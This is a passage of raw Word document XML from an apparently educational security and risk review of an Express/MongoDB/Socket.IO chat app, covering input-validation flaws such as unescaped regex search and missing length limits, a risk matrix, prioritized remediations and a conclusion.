          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>SyntaxError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if the input is not valid JSON. While </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>express-async-handler</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> catches this error and passes it to the error middleware, the error message may expose internal implementation details:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FD3CD7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color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SyntaxError: Unexpected token 'x' in JSON at position 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7913F4B8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability B — No Content Length Limits:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA03746" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>There is no validation on the length of message content, chat names, or user display names:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567538CB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messageControllers.js — sendMessage:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>const { content, chatId } = req.body;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>if (!content || !chatId) {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    return res.sendStatus(400);</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>// No check: content.length &lt;= MAX_MESSAGE_LENGTH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A109EB5" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>A malicious user could send a message containing millions of characters, consuming disproportionate database storage and causing rendering performance issues for recipients.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA5733A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability C — Regex-Based Search Without Escaping:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58423A02" w14:textId="77777777" w:rsidR="00CB2F5B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lastRenderedPageBreak/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userControllers.js:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>{ name: { $regex: req.query.search, $options: "i" } }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB83291" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The search query is passed directly into a MongoDB </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>$regex</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> operator without escaping special regex characters. A user could submit a crafted regex pattern (e.g., </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.*</w:t>
      </w:r>
      <w:r>
        <w:t>) that causes excessive backtracking, potentially leading to a ReDoS (Regular Expression Denial of Service) attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5878EEB1" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="38" w:name="_Toc240065740"/>
      <w:r>
        <w:t>7.3 Current Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="38"/>
    </w:p>
    <w:p w14:paraId="3269EC9F" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>express-async-handler</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> wraps all route handlers, preventing unhandled exceptions from crashing the server. - The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>errorHandler</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> middleware in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>errorMiddleware.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> standardizes error responses. - React's JSX rendering automatically escapes HTML entities, preventing stored XSS from rendering in the UI. - MongoDB document size limit (16MB) provides an implicit upper bound on individual message size.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A74DF4" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="39" w:name="_Toc240065741"/>
      <w:r>
        <w:t>7.4 Recommended Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="39"/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B2F5B" w14:paraId="4AE80C44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41665A57" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000"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0EA48723" w14:textId="77777777" w:rsidR="00CB2F5B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58E100C9" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="7B10E2F3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32B6019" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Wrap </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>JSON.parse</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> in try-catch with sanitized error messages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127F4A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AA1C6A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758E0F92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1DF7951" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Add content length validation (e.g., max 5,000 characters per message)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53DE7C7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32F17E7B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41B1DB6A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F83A8A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Escape regex special characters in search queries using </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>escapeRegex()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EAAC8D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BEA970F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618F369B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F3B377D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Implement request body size limits via </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>express.json({ limit: '1mb' })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DCCA946" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low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F86CDBA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="3053D216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E2EB093" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Add input sanitization library (e.g., </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>validator.js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C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>express-validator</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>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38D031" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low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E97CB01" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1AAF5EFA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B"/>
    <w:p w14:paraId="54DB4D26" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul2"/>
      </w:pPr>
      <w:bookmarkStart w:id="40" w:name="_Toc240065742"/>
      <w:r>
        <w:t>8. Risk Summary Matrix</w:t>
      </w:r>
      <w:bookmarkEnd w:id="40"/>
    </w:p>
    <w:p w14:paraId="7C2B8AB6" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>The following matrix provides a consolidated view of all identified risks, their severity assessments, and current mitigation status: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B2F5B" w14:paraId="3F4CF39F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2D755524" w14:textId="77777777" w:rsidR="00CB2F5B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095004A6" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Risk Area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5DCEFB1E" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000"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68848B2F" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000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3FDC6962" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000"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05C3B03E" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Current Mitigation Status</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="464C3C96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62ADDFA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>1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59270AD" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Authentication &amp; Session Security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F960CF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03B55F" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical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51E4FC" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟠 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18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0CA91E8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Partial — JWT signature verification exists, but storage mechanism and CORS policy are </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>vulnerable</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="57ED0483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5BD0F05" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="0000000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0F62C6C" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Socket.IO Event Integrity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F1323F2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C56C65F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804DA9D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟠 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18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6D43AA66" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Minimal — No authentication on socket layer; REST endpoints are protected but socket events are not</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="016D6CE6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AD3005D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>3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BC1C368" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>In-Memory State Volatility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3723B87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62A693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9D2AE5" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟡 </w:t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8376B2" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>None — No persistence layer for presence data; relies on client reconnection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="73B5EA08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DF76C0D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz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7F906E9" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Data Integrity &amp; Consistency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78B1C4C" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low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EC948A2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AF42B18" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟡 </w:t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426130E" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Partial — Atomic operators used consistently, but no schema-level constraints or pagination</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="2A552E88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4E02F1E" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>5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7C4F44" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Scalability Constraints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6F9B47B" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low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8D7ED1" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18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346F13E" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟡 </w:t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3A19EC8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>None — Single-process architecture; no clustering, caching, or horizontal scaling mechanisms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="36B82A0D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0E6E303" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>6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49FA821" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Input Validation &amp; Error Handling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C01E31E" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18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3F72A34E" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low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BEFC406" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟢 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low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83FE81B" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Partial — Framework defaults (async handler, React escaping) provide baseline protection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5232112F" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B"/>
    <w:p w14:paraId="65CA1775" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul2"/>
      </w:pPr>
      <w:bookmarkStart w:id="41" w:name="_Toc240065743"/>
      <w:r>
        <w:t>9. Prioritized Recommendations</w:t>
      </w:r>
      <w:bookmarkEnd w:id="41"/>
    </w:p>
    <w:p w14:paraId="14F2C61D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>Based on the risk analysis above, the following recommendations are ordered by priority for implementation:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A6FB82" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="42" w:name="_Toc240065744"/>
      <w:r>
        <w:t>9.1 Immediate Priority (Security-Critical)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="42"/>
    </w:p>
    <w:p w14:paraId="610B942C" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement Socket.IO authentication middleware</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Verify JWT tokens on WebSocket connection establishment to prevent identity spoofing (addresses Risk Areas 1 &amp; 2). 2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Restrict CORS to specific origins</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Replace </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Access-Control-Allow-Origin: *</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with the actual frontend domain (addresses Risk </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Area 1). 3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Migrate JWT storage to httpOnly cookies</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Eliminate localStorage-based token storage to prevent XSS-based token theft (addresses Risk Area 1).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1440560C" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="43" w:name="_Toc240065745"/>
      <w:r>
        <w:t>9.2 High Priority (Data Protection)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="43"/>
    </w:p>
    <w:p w14:paraId="0331B9B8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement message pagination</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Add cursor-based pagination with a default limit of 50 messages per request (addresses Risk Areas 4 &amp; 5). 5. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Add per-socket rate limiting</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Prevent event flooding by limiting socket emissions to a reasonable rate (addresses Risk Area 2). 6. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Generate unique passwords for Quick Connect users</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Replace the hardcoded password with cryptographically random generated passwords (addresses Risk Area 1).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25AE7387" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="44" w:name="_Toc240065746"/>
      <w:r>
        <w:t>9.3 Medium Priority (Resilience &amp; Performance)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="44"/>
    </w:p>
    <w:p w14:paraId="3092D7EA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">7. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement Redis-backed presence store</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Migrate </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>onlineUsers</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Map to Redis for crash-resilient presence tracking (addresses Risk Areas 3 &amp; 5). 8. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Add Node.js clustering</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Utilize multiple CPU cores for improved throughput and fault tolerance (addresses Risk Area 5). 9. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cache unread counts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Reduce per-request aggregation overhead by maintaining incremental counters (addresses Risk Area 5).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C71FCA2" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="45" w:name="_Toc240065747"/>
      <w:r>
        <w:t>9.4 Low Priority (Hardening)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="45"/>
    </w:p>
    <w:p w14:paraId="0BF5976A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">10. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Add input validation middleware</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Implement content length limits, regex escaping, and request body size limits (addresses Risk Area 6). 11. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Add database indexes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Create compound indexes on frequently queried fields to optimize query performance (addresses Risk Areas 4 &amp; 5). 12. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement Content Security Policy headers</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Add CSP headers to further reduce XSS attack surface (addresses Risk Area 1).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67BE78B3" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul2"/>
      </w:pPr>
      <w:bookmarkStart w:id="46" w:name="_Toc240065748"/>
      <w:r>
        <w:t>10. Conclusion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="46"/>
    </w:p>
    <w:p w14:paraId="112957E7" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This analysis identified </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>6 distinct risk areas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> across the Instant Messaging system's design, ranging from security-critical authentication vulnerabilities to performance-related scalability constraints. While the system functions correctly within its intended scope (small-scale, single-server deployment for educational purposes), the identified risks represent important design trade-offs that would need to be addressed before production deployment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A1DE978" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The key finding is that the most critical risks (Areas 1 and 2) relate to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>authentication and authorization gaps</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the WebSocket layer — specifically, the absence of JWT verification for socket connections and the use of localStorage for token storage. These represent the highest-priority items for remediation.</w:t>
      </w:r>
    </w:p>
